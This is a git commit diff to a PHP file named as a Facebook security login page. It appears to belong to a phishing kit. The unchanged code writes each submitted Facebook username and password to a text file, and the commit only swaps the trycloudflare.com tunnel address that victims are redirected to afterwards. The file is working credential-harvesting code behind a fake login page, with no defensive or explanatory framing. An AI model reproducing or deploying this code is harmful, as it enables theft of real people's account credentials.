914aa7a30144a2eb996528325b347456ec349612
Mahfuz <11mahfuzrahman148@gmail.com>
2022-04-16 22:53:50 +0600

    lnk3

--- .sites/fb_security/login.php
+++ .sites/fb_security/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://criminal-kodak-assets-amd.trycloudflare.com');
+header('Location: https://jimmy-playing-den-laws.trycloudflare.com');
 exit();
 ?>
